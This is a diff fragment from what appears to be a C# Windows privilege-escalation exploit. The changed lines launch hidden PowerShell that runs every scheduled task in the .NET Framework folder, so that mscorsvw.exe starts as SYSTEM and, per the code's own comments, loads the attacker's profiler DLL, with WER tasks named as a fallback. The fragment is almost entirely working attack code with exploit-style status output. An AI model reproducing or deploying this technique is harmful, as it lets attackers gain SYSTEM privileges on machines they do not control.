@@ -292,22 +292,21 @@ if($r-eq 0){
 
         /* Trigger mscorsvw.exe (NGEN) as SYSTEM - it hosts CLR and will load our profiler DLL */
         Console.WriteLine("[*] Triggering .NET NGEN task (mscorsvw.exe as SYSTEM)...");
+        /* Run every task in .NET Framework folder - one of them runs mscorsvw.exe as SYSTEM */
         string ngenPs =
+            "try{" +
             "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
             "$f=$s.GetFolder('\\Microsoft\\Windows\\.NET Framework');" +
-            "$tasks=$f.GetTasks(0);" +
-            "foreach($t in $tasks){" +
-            "  if($t.Definition.Actions|Where-Object{$_.Path -like '*mscorsvw*'}){" +
-            "    $t.Run($null);Write-Host $t.Name;break}" +
-            "}";
+            "foreach($t in $f.GetTasks(0)){$t.Run($null);Write-Host('[ngen]'+$t.Name)}" +
+            "}catch{Write-Host('err:'+$_)}";
         var npsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
             $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{ngenPs}\"")
-            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true};
+            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
         string ngenOut = "";
         using(var p=System.Diagnostics.Process.Start(npsi)) {
-            ngenOut = p.StandardOutput.ReadToEnd(); p.WaitForExit(5000);
+            ngenOut = p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd(); p.WaitForExit(8000);
         }
-        Console.WriteLine($"[+] NGEN task triggered: {ngenOut.Trim()}");
+        Console.WriteLine($"[+] NGEN: {ngenOut.Trim()}");
 
         /* Also trigger WER as fallback */
         string werPs = "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
